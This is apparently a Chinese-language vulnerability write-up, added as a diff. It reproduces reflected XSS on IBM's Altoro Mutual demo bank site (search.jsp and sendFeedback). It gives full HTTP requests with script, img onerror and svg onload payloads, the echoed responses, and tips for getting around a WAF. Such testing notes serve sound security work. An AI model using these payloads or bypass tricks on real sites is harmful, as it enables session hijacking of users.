@@ -1,0 +1,94 @@
+# demo.testfire.net（IBM Altoro Mutual 演示银行）/search.jsp 反射型 XSS
+
+## 漏洞归类
+output encoding validation —— query 参数进入 HTML 文本节点前未做实体编码；因可窃取会话 cookie，归入 auth-bypass 大类。
+
+## 前置条件
+- 目标可达，`/search.jsp` 无需认证
+- 响应头为 `Content-Type: text/html;charset=ISO-8859-1`
+- 无需登录、无需 CSRF token（GET 即可）
+
+## 注入点
+响应体中固定句式：
+
+```
+<p>No results were found for the query:<br /><br />
+        <query 参数原样输出>
+```
+
+## 复现请求
+
+### 1) 基础验证（script 标签直出）
+
+```http
+GET /search.jsp?query=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
+Host: demo.testfire.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+```
+
+响应（HTTP/1.1 200 OK）第 103 行原文：
+
+```html
+		<script>alert(1)</script>
+```
+
+### 2) 闭合上下文 + 事件处理器（script 被过滤时的替代）
+
+```http
+GET /search.jsp?query=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E%3C!-- HTTP/1.1
+Host: demo.testfire.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+```
+
+响应第 103 行原文：
+
+```html
+		"><img src=x onerror=alert(document.domain)><!--
+```
+
+### 3) SVG onload 变体
+
+```http
+GET /search.jsp?query=a%22%3E%3Csvg%20onload%3Dalert(21)%3E HTTP/1.1
+Host: demo.testfire.net
+```
+
+响应第 103 行原文：
+
+```html
+		a"><svg onload=alert(21)>
+```
+
+### 4) POST 型反射面：/sendFeedback 的 name 字段
+
+```http
+POST /sendFeedback HTTP/1.1
+Host: demo.testfire.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: <n>
+
+name=<script>alert(12)</script>&email_addr=a@b.c&subject=s&comments=c&cfile=comments.txt&submit=Submit
+```
+
+响应（200）原文：
+
+```html
+<p>Thank you for your comments, <script>alert(12)</script>.  They will be reviewed by our Customer Service staff ...
+```
+
+## 判据
+- payload 的 `<` `>` `"` 以**原文**出现在响应 HTML 中（不是 `&lt;` `&quot;`）；
+- 出现位置在可执行上下文（文本节点 / 事件属性），而非被引号包裹且已转义的属性值内；
+- 用 `grep -n "alert(1)"` 能命中且行内保留尖括号 = 成立。
+
+## 失败时的常见原因
+1. 只看 HTTP 200 就下结论 —— 必须看响应体里的实体化情况。
+2. 参数名写错（是 `query`，不是 `q`/`search`）；先发基线看固定句式是否出现。
+3. WAF 拦 `<script>` —— 换 `<img onerror>` / `<svg onload>` / `<details open ontoggle>`，并检查是否返回拦截页而非业务页。
+4. 站点做了重定向（302 到首页）导致丢参 —— 加 `-L` 或用 `--max-redirs 0` 看真实响应码。
+5. 使用了 `-I`/HEAD —— 本靶只有 GET 完整响应体才带回显。
+
+## 采集信息
+- 验证时间：2026-11-08 11:32 UTC
+- 工具：本机 curl.exe 直连
+- 原始响应留存：search_output encoding validation1.txt / 2.txt / 3.txt、fb_post2.txt
